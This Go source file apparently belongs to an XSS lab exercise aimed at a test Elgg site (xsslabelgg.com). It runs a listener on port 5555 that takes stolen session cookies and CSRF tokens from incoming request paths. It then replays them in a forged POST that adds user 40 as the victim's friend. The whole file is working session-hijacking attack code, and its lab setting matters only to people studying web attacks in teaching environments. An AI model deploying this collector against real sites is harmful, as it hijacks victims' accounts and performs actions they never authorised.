package main

import (
	"bytes"
	"fmt"
	"net/http"

	"github.com/go-chi/chi"
	"github.com/go-chi/chi/middleware"
)

func main() {
	r := chi.NewRouter()
	r.Use(middleware.Logger)
	r.Get("/c={cookie}&ts={ts}&token={token}", func(w http.ResponseWriter, r *http.Request) {
		cookie := chi.URLParam(r, "cookie")
		ts := chi.URLParam(r, "ts")
		token := chi.URLParam(r, "token")
		userID := "40" // the id of the user that will be added

		// friend request URL
		url := "http://www.xsslabelgg.com/action/friends/add?friend=" + userID + "&__elgg_ts=" + ts + "&__elgg_token=" + token
		// add the cookie to the request header
		req, err := http.NewRequest("POST", url, bytes.NewBufferString("")) // empty body
		req.Header.Set("cookie", cookie)

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()

		fmt.Println("Request was sent and a " + resp.Status + " was recieved.")

		w.WriteHeader(404)
	})
	http.ListenAndServe(":5555", r)
}
